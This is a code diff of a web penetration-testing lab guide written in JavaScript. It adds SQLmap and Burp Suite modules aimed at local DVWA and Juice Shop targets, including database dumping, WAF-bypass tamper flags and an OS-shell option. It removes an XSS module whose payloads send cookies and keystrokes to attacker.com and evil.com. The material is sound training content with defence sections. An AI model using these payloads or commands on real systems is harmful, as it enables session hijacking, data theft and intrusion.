+  analogy: { emoji: '🤖', text: `You've just learned to pick a single lock by hand — you understand how the pins work, how tension wrenches apply pressure, and how to feel for the click. SQLmap is like a robotic lockpicking machine that can test every pin combination across every lock in the building in minutes. It uses the same techniques you learned by hand, but at machine speed. You still need to understand the fundamentals to interpret results and troubleshoot failures.` },
+
+  steps: [
+    { title: 'Identify the Target URL', desc: 'First, use manual testing (the SQLi module) or Burp Suite to identify a URL with a parameter you suspect is vulnerable. For DVWA\'s SQLi page, the URL looks like this:', code: { lang: 'text', text: 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' } },
+    { title: 'Run a Basic SQLmap Scan (DVWA)', desc: 'Open a terminal in Kali Linux. Pass the target URL to SQLmap with the <code>-u</code> flag. Include the session cookie so SQLmap is authenticated. SQLmap will test the <code>id</code> parameter for injection vulnerabilities.', code: { lang: 'bash', text: 'sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=your_session_id; security=low"' } },
+    { title: 'Automating JSON APIs (Juice Shop)', desc: 'Juice Shop uses JSON payloads, not standard form fields. Using `-u` is tedious for JSON. Instead, intercept the login request in Burp Suite, right-click, and select "Save item" as `request.txt`.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"test"}' } },
+    { title: 'Run SQLmap with a Burp Request', desc: 'Use the `-r` flag to point SQLmap to the saved file. SQLmap will automatically parse the headers, URL, and the JSON body, and start testing every JSON value.', code: { lang: 'bash', text: 'sqlmap -r request.txt --batch' } },
+    { title: 'Enumerate All Databases', desc: 'Once SQLmap confirms the injection point, use <code>--dbs</code> to list every database on the server:', code: { lang: 'bash', text: 'sqlmap -r request.txt --dbs' } },
+    { title: 'Enumerate Tables in a Database', desc: 'Pick a database from the results (e.g., <code>dvwa</code> or SQLite for Juice Shop) and list all its tables with <code>-D</code> and <code>--tables</code>:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa --tables' } },
+    { title: 'Dump the Data', desc: 'Extract the actual data from the columns you care about. SQLmap will even attempt to crack password hashes automatically using a dictionary attack:', code: { lang: 'bash', text: 'sqlmap -r request.txt -D dvwa -T users -C user,password --dump' } },
+    { title: 'Using Tamper Scripts', desc: 'Web Application Firewalls (WAFs) often block basic SQLi syntax (like blocking spaces). SQLmap has "tamper scripts" to obfuscate payloads. Use `--tamper=space2comment` to replace spaces with `/**/` comments to bypass basic WAFs.', code: { lang: 'bash', text: 'sqlmap -r request.txt --tamper=space2comment --level=3 --risk=2' } }
+  ],
+
+  defense: [
+    { title: 'Same Defenses as Manual SQLi', desc: 'All defenses from the SQL Injection module apply — parameterized queries, input validation, least-privilege DB accounts, and WAFs are your primary protections.' },
+    { title: 'Rate Limiting', desc: 'SQLmap sends many rapid requests. Rate limiting and anomaly detection can flag or block automated scanning patterns.' },
+    { title: 'Intrusion Detection Systems (IDS)', desc: 'Tools like Snort or Suricata can detect SQLmap\'s signature patterns (user-agent strings, payload patterns) and alert security teams.' },
+    { title: 'Disable Detailed Error Messages', desc: 'Error-based SQLi relies on the server exposing database errors. Configure the application to show generic error pages in production.' }
+  ],
+
+  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
+    ['-u URL',         'Target URL with injectable parameter',              'sqlmap -u "http://target/page?id=1"'],
+    ['-r FILE',        'Use a saved HTTP request file from Burp Suite',     'sqlmap -r request.txt'],
+    ['--dbs',          'Enumerate all databases on the server',             'sqlmap -u URL --dbs'],
+    ['-D DB --tables', 'List all tables in a specific database',            'sqlmap -u URL -D dvwa --tables'],
+    ['-T TBL --columns','List columns in a specific table',                 'sqlmap -u URL -D dvwa -T users --columns'],
+    ['--dump',         'Extract (dump) data from specified table/columns',  'sqlmap -u URL -D dvwa -T users --dump'],
+    ['--batch',        'Non-interactive mode (auto-answers all prompts)',   'sqlmap -r req.txt --batch'],
+    ['--level=N',      'Test thoroughness (1-5). Higher = more params',    'sqlmap -u URL --level=5'],
+    ['--risk=N',       'Payload aggressiveness (1-3). Higher = riskier',   'sqlmap -u URL --risk=3'],
+    ['--forms',        'Auto-detect and test HTML forms on a page',        'sqlmap -u "http://target/login" --forms'],
+    ['--os-shell',     'Attempt to spawn an interactive OS shell',          'sqlmap -u URL --os-shell'],
+    ['--cookie=C',     'Set HTTP Cookie header for authentication',         'sqlmap -u URL --cookie="PHPSESSID=abc"'],
+    ['--threads=N',    'Parallelise requests (default 1, max 10)',         'sqlmap -u URL --threads=10'],
+    ['--tamper=SCRIPT','Apply payload tampering scripts to bypass WAFs',    'sqlmap -u URL --tamper=space2comment']
+  ]}
+},
+
+// ─────────────────────────────────────────────────────────────────────────────
+// RED 05: Burp Suite Proxy Interception
+// ─────────────────────────────────────────────────────────────────────────────
+{
+  id: 'burp-proxy', track: 'red', num: '05', short: 'burp',
+  title: 'Burp Suite Proxy Interception',
+  subtitle: 'Learn how web proxies capture, inspect, and modify HTTP traffic between your browser and a target application.',
+  tag: 'Red 05 — Proxy Fundamentals',
+
+  concept: [
+    `Every time you visit a website, your browser sends an <strong>HTTP request</strong> to a server, which replies with an <strong>HTTP response</strong>. Normally this exchange is invisible — it happens in milliseconds behind the scenes.`,
+    `A <strong>web proxy</strong> is software that sits <em>between</em> your browser and the server. It intercepts every request and response, letting you read, modify, or replay them before they reach their destination.`,
+    `<strong>Burp Suite</strong> is the industry-standard web proxy for penetration testers. When you enable its <strong>Intercept</strong> feature, every outbound request from Burp's built-in Chromium browser is paused and displayed in a raw text editor. You can change parameters, headers, or the body — then forward the modified request to the server.`,
+    `This gives you complete control over the conversation between client and server, which is the foundation of almost every web application attack.`
+  ],
+
+  analogy: { emoji: '📬', text: `Imagine a postal inspector stationed at a sorting facility. Every letter (HTTP request) leaving your house passes through the inspector's desk. They can open the envelope, read the contents, change the delivery address, swap the letter inside, or simply let it pass through. The recipient (server) has no idea the letter was ever touched. That inspector is your Burp Suite proxy.` },
+
+  steps: [
+    { title: 'Start Burp Suite and Open the Built-in Browser', desc: 'Launch Burp Suite Community Edition. Navigate to the <strong>Proxy</strong> tab and click <strong>"Open browser"</strong>. This opens a Chromium instance pre-configured to route all traffic through Burp — no manual proxy settings needed.', code: null },
+    { title: 'Enable Intercept Mode', desc: 'In the <strong>Proxy → Intercept</strong> sub-tab, click the toggle so it reads <strong>"Intercept is on"</strong>. From this moment, every HTTP request from the built-in browser will be paused and shown to you.', code: null },
+    { title: 'Browse to the Juice Shop Target', desc: 'In Burp\'s built-in browser, navigate to the local Juice Shop instance. The page will appear to hang because Burp is holding the request.', code: { lang: 'url', text: 'http://localhost:3000' } },
+    { title: 'Inspect the Intercepted Request', desc: 'Switch back to the Burp window. You\'ll see the raw GET request in the Intercept panel. Study the structure — the request line, Host header, User-Agent, cookies, and any query parameters.', code: { lang: 'http', text: 'GET / HTTP/1.1\nHost: localhost:3000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nAccept-Language: en-US,en;q=0.9\nConnection: keep-alive' } },
+    { title: 'Forward and Observe the Response', desc: 'Click <strong>"Forward"</strong> in Burp to send the request to the server. The Juice Shop homepage will now load. Check the <strong>HTTP history</strong> sub-tab to see both the request and the server\'s response, including status code, headers, and body.', code: null },
+    { title: 'Modify a Request In-Flight', desc: 'Navigate to the Juice Shop login page. When Burp intercepts the POST request, change a parameter value directly in the raw editor before forwarding it. This is the core skill you\'ll use in every subsequent module.', code: { lang: 'http', text: 'POST /rest/user/login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n{"email":"test@test.com","password":"modified_value"}' } },
+    { title: 'Abusing Client-Side Validation', desc: 'A common vulnerability is relying solely on the browser (client) for security checks. In Juice Shop, try giving a product a negative quantity or an unrealistic price. The browser UI might prevent you from typing "-1", but you can intercept the API request in Burp and change the quantity to a negative number before it hits the server.', code: { lang: 'json', text: '{"ProductId": 1, "quantity": -10}' } },
+    { title: 'Discover the Hidden Score Board', desc: 'Juice Shop has a hidden "Score Board" tracking your hacking progress. The link is hidden in the UI, but by intercepting the main JavaScript bundle request and looking at the response (or using Repeater), you can find the path. Then simply browse to it.', code: { lang: 'url', text: 'http://localhost:3000/#/score-board' } },
+    { title: 'Using Burp Repeater', desc: 'Find any request in your <strong>HTTP history</strong>, right-click, and select <strong>Send to Repeater</strong>. Repeater allows you to replay the exact same request hundreds of times, tweaking one parameter at a time and instantly seeing the response without clicking through the UI again.', code: null }
+  ],
+
+  defense: [
+    { title: 'HTTPS / TLS Encryption', desc: 'Encrypt all traffic with TLS certificates. Even if intercepted on the network, the data is unreadable without the private key. Always redirect HTTP to HTTPS.' },
+    { title: 'HTTP Strict Transport Security (HSTS)', desc: 'Set the <code>Strict-Transport-Security</code> header so browsers refuse to connect over plain HTTP after the first visit.' },
+    { title: 'Certificate Pinning', desc: 'Mobile apps can pin the server\'s exact certificate, rejecting proxy certificates like Burp\'s. This prevents MITM on production mobile traffic.' },
+    { title: 'Input Validation on the Server', desc: 'Never trust client-side data. Validate and sanitize every parameter on the server — a proxy can bypass any client-side checks (like min/max length, regex, or dropdown restrictions).' }
+  ],
+
+  payloads: { headers: ['Item', 'Description', 'Example'], rows: [
+    ['GET',           'Retrieves a resource from the server',                      'GET /api/users HTTP/1.1'],
+    ['POST',          'Sends data to the server (login forms, file uploads)',       'POST /rest/user/login HTTP/1.1'],
+    ['PUT',           'Replaces an entire resource on the server',                 'PUT /api/users/1 HTTP/1.1'],
+    ['DELETE',        'Removes a resource from the server',                        'DELETE /api/users/1 HTTP/1.1'],
+    ['Host',          'Header specifying the target domain',                       'Host: localhost:3000'],
+    ['Cookie',        'Header carrying session tokens',                            'Cookie: token=abc123'],
+    ['Content-Type',  'Header declaring the format of the request body',           'Content-Type: application/json'],
+    ['Authorization', 'Header carrying credentials (Basic, Bearer, etc.)',         'Authorization: Bearer eyJhb...'],
+    ['200 OK',        'Server processed the request successfully',                 'HTTP/1.1 200 OK'],
+    ['301 Redirect',  'Resource moved permanently to another URL',                 'HTTP/1.1 301 Moved Permanently'],
+    ['403 Forbidden', 'Server refuses to authorize the request',                   'HTTP/1.1 403 Forbidden'],
+    ['500 Server Error','Unexpected error on the server side',                     'HTTP/1.1 500 Internal Server Error']
+  ]}
+},
+
+// ─────────────────────────────────────────────────────────────────────────────
+// RED 06: Brute Force with Hydra
+// ─────────────────────────────────────────────────────────────────────────────
+{
+  id: 'hydra', track: 'red', num: '06', short: 'hydra',
   title: 'Brute Force Attacks with Hydra',
   subtitle: 'Learn how password guessing attacks work, how to use Hydra for HTTP, SSH, and FTP brute forcing, and how to defend against them.',
-  tag: 'Module 5 — Credential Attacks',
+  tag: 'Red 06 — Credential Attacks',
 
   concept: [
     `<strong>Brute force attacks</strong> are a category of attacks where the attacker systematically tries every possible combination of credentials until finding the correct one. In practice, attackers don't try truly random combinations — they use <strong>wordlists</strong> (dictionaries of common passwords and usernames).`,
@@ -339,55 +383,11 @@ const MODULES = [
   ]}
 },
 
-// ─────────────────────────────────────────────────────────────────────────────
-// MODULE 6: Cross-Site Scripting (XSS)
-// ─────────────────────────────────────────────────────────────────────────────
 {
-  id: 'xss', num: '06', short: 'xss',
-  title: 'Cross-Site Scripting (XSS)',
-  subtitle: 'Learn how injecting malicious client-side scripts can hijack user sessions and manipulate web pages.',
-  tag: 'Module 6 \u2014 Client-Side Attacks',
-
-  concept: [
-    '<strong>Cross-Site Scripting (XSS)</strong> occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious JavaScript in the victim\'s browser.',
-    '<strong>Reflected XSS</strong> happens when user input is immediately returned (reflected) by the web application in an error message, search result, or any other response. The payload is typically delivered via a crafted link.',
-    '<strong>Stored XSS</strong> (Persistent) is more dangerous. The malicious script is saved on the target server (e.g., in a database via a comment or profile field) and executed every time a user views the infected page.',
-    '<strong>DOM-based XSS</strong> occurs entirely in the browser when client-side JavaScript takes data from an attacker-controllable source (like the URL hash) and passes it to a dangerous sink (like <code>innerHTML</code> or <code>eval()</code>).'
-  ],
-
-  analogy: { emoji: '\uD83C\uDFAD', text: 'Imagine putting up a poster on a community noticeboard. Normally, you just write text. But if the noticeboard doesn\'t restrict what you pin up, you could pin a magical set of instructions that hypnotize anyone who reads them. When a victim looks at the board, they unknowingly execute your instructions \u2014 perhaps handing over their wallet. XSS is injecting those magical instructions (JavaScript) into a webpage.' },
-
-  steps: [
-    { title: 'Reflected XSS via Search', desc: 'In Juice Shop, the search bar reflects your input directly into the page. Try searching for an HTML tag like <code>&lt;h1&gt;Test&lt;/h1&gt;</code>. If the text renders as a heading, HTML is being interpreted. Now try an iframe payload:', code: { lang: 'html', text: '<iframe src="javascript:alert(\'xss\')">' } },
-    { title: 'DOM XSS via URL Hash', desc: 'Juice Shop\'s Angular frontend processes the URL hash client-side. If this data is unsafely rendered into the DOM, it creates a DOM XSS vector. Try navigating to this URL directly:', code: { lang: 'url', text: 'http://localhost:3000/#/search?q=<iframe src="javascript:alert(\'xss\')">' } },
-    { title: 'Stored XSS via Feedback', desc: 'Navigate to the Customer Feedback section. Enter an XSS payload in the comment field. The script is saved to the database and will trigger whenever the feedback is viewed (e.g., by an admin in the Administration panel).', code: { lang: 'html', text: '<script>alert("Stored XSS via Feedback!")</script>' } },
-    { title: 'Stealing Cookies', desc: 'The most common real-world XSS goal is stealing session cookies. An attacker writes a script that reads <code>document.cookie</code> and sends it to their own server, effectively hijacking the victim\'s session.', code: { lang: 'html', text: '<script>fetch("http://attacker.com/steal?cookie=" + btoa(document.cookie))</script>' } },
-    { title: 'Keylogging via XSS', desc: 'Advanced XSS payloads can silently capture keystrokes on the infected page. The attacker injects an event listener that forwards every key pressed to their server.', code: { lang: 'javascript', text: 'document.addEventListener("keypress", function(e) {\\n  fetch("http://attacker.com/log?k=" + e.key);\\n});' } }
-  ],
-
-  defense: [
-    { title: 'Context-Aware Output Encoding', desc: 'Never trust user input. Before rendering data in the browser, encode it according to where it will be placed (HTML body, attribute, JavaScript variable). Use framework features like React or Angular that auto-escape by default.' },
-    { title: 'Content Security Policy (CSP)', desc: 'A strict CSP prevents the browser from executing inline scripts and restricts where external scripts can be loaded from. It acts as a defense-in-depth layer against XSS.' },
-    { title: 'HttpOnly Cookies', desc: 'Set the <code>HttpOnly</code> flag on session cookies. This prevents client-side JavaScript (and therefore XSS attacks) from accessing the cookie.' },
-    { title: 'Sanitization', desc: 'If you must allow users to submit rich text (HTML), use a robust sanitization library like DOMPurify to strip out dangerous tags and attributes (like <code>&lt;script&gt;</code> or <code>onerror</code>).' }
-  ],
-
-  payloads: { headers: ['Payload', 'Type / Purpose', 'Description'], rows: [
-    ['&lt;script&gt;alert(1)&lt;/script&gt;',             'Basic',        'The classic proof of concept. Executes a simple alert box.'],
-    ['&lt;img src=x onerror=alert(1)&gt;',                'Image Vector', 'Executes JavaScript when the browser fails to load the fake image source.'],
-    ['&lt;iframe src="javascript:alert(1)"&gt;',           'Iframe',       'Executes script within an iframe. Often bypasses basic regex filters.'],
-    ['&lt;svg onload=alert(1)&gt;',                       'SVG Vector',   'Executes script when the SVG element finishes loading.'],
-    ['"&gt;&lt;script&gt;alert(1)&lt;/script&gt;',        'Break Out',    'Closes an existing HTML attribute/tag before injecting the payload.'],
-    ['javascript:alert(1)',                                'URI Scheme',   'Used in href or src attributes that expect a URL.'],
-    ['&lt;script&gt;fetch("http://evil.com/?c="+document.cookie)&lt;/script&gt;', 'Exfiltration', 'Steals the session cookie and sends it to the attacker.']
-  ]}
-},
-
-{
-  id: 'soc-simulator', num: '07', short: 'soc',
+  id: 'soc-simulator', track: 'blue', num: '01', short: 'soc',
   title: 'Blue Team SOC Analyst',
   subtitle: 'Defend the network! Monitor live traffic, spot the active exploit, and remediate the threat.',
-  tag: 'Module 7 — Defensive Simulation',
+  tag: 'Blue 01 — Defensive Simulation',
 
   concept: [
     `A <strong>Security Operations Center (SOC)</strong> is the central command post for a blue team. Analysts monitor network traffic, system logs, and intrusion detection alerts to identify and neutralize active threats in real-time.`,
@@ -420,13 +420,13 @@ const MODULES = [
 },
 
 // ─────────────────────────────────────────────────────────────────────────────
-// MODULE 8: Network Traffic Analysis
+// BLUE 02: Network Traffic Analysis
 // ─────────────────────────────────────────────────────────────────────────────
 {
-  id: 'net-analyst', num: '08', short: 'net',
+  id: 'net-analyst', track: 'blue', num: '02', short: 'net',
   title: 'Network Traffic Analysis',
   subtitle: 'Capture, decode, and analyze raw network packets to hunt for malware beacons, credential theft, and data exfiltration.',
-  tag: 'Module 8 — Blue Team Forensics',
+  tag: 'Blue 02 — Network Forensics',
 
   concept: [
     `Every byte that travels across a network can be captured and inspected. <strong>Packet analysis</strong> is the art of reading these raw captures to reconstruct what happened during a security incident — or to catch an attack <em>in progress</em>.`,
@@ -463,6 +463,26 @@ const MODULES = [
     ['tcp.flags.syn == 1',              'SYN flood detection',                'DDoS'],
     ['ip.src == 10.0.0.X && dns',       'Internal host doing unusual DNS',    'Lateral Movement']
   ]}
+},
+
+// ─────────────────────────────────────────────────────────────────────────────
+// BLUE 03: Defenses & Remediation (shell — content arrives in a later task)
+// ─────────────────────────────────────────────────────────────────────────────
+{
+  id: 'defenses', track: 'blue', num: '03', short: 'defend',
+  title: 'Defenses & Remediation',
+  subtitle: 'The defensive fixes for each attack in the red-team path, collected in one place.',
+  tag: 'Blue 03 — Hardening',
+
+  concept: [
+    `Every attack in the red-team path has a matching defence. This page will collect them so you can move from "how it breaks" to "how it is fixed".`
+  ],
+
+  analogy: { emoji: '🛡️', text: `A lock is only useful once you know how it gets picked. Learn the attack, then learn the fix.` },
+
+  steps: [],
+
+  payloads: { headers: ['Attack', 'Primary Defence', 'Risk Detected'], rows: [] }
 }
 
 ]; // end MODULES
@@ -487,8 +507,18 @@ const dockerMount  = document.getElementById('dockerWizardMount');
    SIDEBAR NAVIGATION
    ═══════════════════════════════════════════════════════════════════════════════ */
 
+const TRACK_LABELS = { red: 'red team', blue: 'blue team' };
+
 function buildSidebar() {
+  let lastTrack = null;
   MODULES.forEach((mod, i) => {
+    if (mod.track !== lastTrack) {
+      lastTrack = mod.track;
+      const label = document.createElement('div');
+      label.className = 'nav-section-label nav-track-label nav-track-' + mod.track;
+      label.textContent = TRACK_LABELS[mod.track] || mod.track;
+      sidebarNav.appendChild(label);
+    }
     const item = document.createElement('div');
     item.className = 'nav-item';
     item.dataset.index = i;
@@ -520,17 +550,25 @@ function renderHome() {
   const cont = document.getElementById('homeContinue');
   if (!H || !list) return;
 
-  const rows = H.homeRows(MODULES);
-  const delays = H.rowDelays(rows.length + 1, 200);
-  list.innerHTML = rows.map((r, i) => `
-    <button type="button" class="home-row fade-in" style="--i:${delays[i + 1]}ms" data-index="${r.index}" data-module="${escapeAttr(r.id)}">
+  const groups = H.trackGroups(MODULES);
+  const total = groups.red.length + groups.blue.length;
+  const delays = H.rowDelays(total + 1, 200);
+  let n = 0;
+  const rowHtml = (r) => `
+    <button type="button" class="home-row fade-in" style="--i:${delays[++n]}ms" data-index="${r.index}" data-module="${escapeAttr(r.id)}">
       <span class="home-row-num">${escapeHtml(r.num)}</span>
       <span class="home-row-short">${escapeHtml(r.short)}</span>
       <span class="home-row-body">
         <span class="home-row-title">${escapeHtml(r.title)}</span>
         <span class="home-row-summary">${escapeHtml(r.summary)}</span>
       </span>
-    </button>`).join('');
+    </button>`;
+  const groupHtml = (track, heading) => groups[track].length ? `
+    <div class="home-group" data-track="${track}">
+      <h4 class="home-group-label">${heading}</h4>
+      ${groups[track].map(rowHtml).join('')}
+    </div>` : '';
+  list.innerHTML = groupHtml('red', 'red team path') + groupHtml('blue', 'blue team');
   list.querySelectorAll('.home-row').forEach((btn) => {
     btn.addEventListener('click', () => selectModule(Number(btn.dataset.index)));
   });
@@ -3164,7 +3202,6 @@ const TRANSLATIONS = {
   en: {
     // Sidebar
     brand_sub: 'Web Pentest Lab Guide',
-    nav_modules: 'Modules',
     btn_enter_lab: 'Enter Lab Mode',
     btn_exit_lab: 'Exit Lab Mode',
     btn_settings: 'Settings',
